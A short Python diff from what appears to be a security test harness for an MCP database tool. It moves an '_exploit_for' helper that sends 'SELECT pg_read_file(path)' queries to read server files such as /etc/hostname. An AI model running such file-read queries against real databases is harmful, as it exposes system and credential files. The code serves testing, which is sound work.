@@ -77,6 +77,15 @@ _HOSTNAME_READ_PATH = "/etc/hostname"
 KEPT_PLACES: tuple[str, ...] = (*_FILE_PLACES, "container-hostname")
 
 
+def _exploit_for(place_id: str):
+    async def exploit(places: Places, client: MCPClientPort) -> None:
+        await _connect(client)
+        path = _first_path(places[place_id])
+        await _run_query(client, f"SELECT \"pg_read_file\"('{path}')")
+
+    return exploit
+
+
 def _first_path(place: Place) -> str:
     coordinates = place.coordinates
     raw = coordinates.paths[0] if coordinates.paths is not None else coordinates.path
@@ -91,15 +100,6 @@ async def _connect(client: MCPClientPort) -> None:
 
 async def _run_query(client: MCPClientPort, sql: str) -> None:
     await client.call_tool("run_query", {"sql": sql, **_QUERY_KEYS})
-
-
-def _exploit_for(place_id: str):
-    async def exploit(places: Places, client: MCPClientPort) -> None:
-        await _connect(client)
-        path = _first_path(places[place_id])
-        await _run_query(client, f"SELECT \"pg_read_file\"('{path}')")
-
-    return exploit
 
 
 async def _hostname_exploit(places: Places, client: MCPClientPort) -> None:
